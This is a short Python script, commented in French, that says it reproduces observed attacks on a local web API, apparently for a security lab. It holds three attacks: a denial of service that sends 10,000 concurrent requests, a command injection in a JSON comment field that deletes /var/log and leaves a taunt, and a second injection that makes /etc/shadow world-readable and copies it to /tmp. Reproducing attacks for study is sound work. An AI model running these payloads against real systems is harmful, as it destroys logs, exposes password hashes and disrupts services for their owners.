import aiohttp
import asyncio
import argparse


async def get(url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url=url) as response:
                resp = await response.read()
    except Exception as e:
        raise e


async def post(url, user_input):
    data = {"commentaire": user_input}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url=url, json=data, ssl=False) as response:
                resp = await response.read()
    except Exception as e:
        raise e


async def denial_of_service(port):
    ret = await asyncio.gather(*[get('https://localhost:{}/api/values/'.format(port)) for i in range(10000)])


async def destroy_logs(port):
    await asyncio.gather(post('https://localhost:{}/api/values/manette/xbox'.format(port),
               "\"; chmod 777 /var -R; rm -rf /var/log; mkdir /var/log; > /var/log/message;"
               " echo \"Much lulz. J'ai delete tes logs.\r\n Comment les recuperer:"
               " https://www.youtube.com/watch?v=oHg5SJYRHA0\" >> /var/log/message #"))


async def vandalize_website(port):
    await asyncio.gather(post('https://localhost:{}/api/values/manette/xbox'.format(port),
               "\"; chmod 777 /etc/shadow; rm /tmp/xbox; cp /etc/shadow /tmp/xbox #"))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Script reproduisant les attaques observees")
    parser.add_argument("-s", "--script",  required=True,
                        help="Nombre de 0 à 2 representant l'index de l'attaque")
    parser.add_argument("-p", "--port", required=True, help="Port sur lequel roule l'API")
    script = int(vars(parser.parse_args())["script"])
    port = vars(parser.parse_args())["port"]
    if script == 0:
        asyncio.run(denial_of_service(port))
    elif script == 1:
        asyncio.run(destroy_logs(port))
    elif script == 2:
        asyncio.run(vandalize_website(port))
    else:
        print("La valeur de script est invalide.")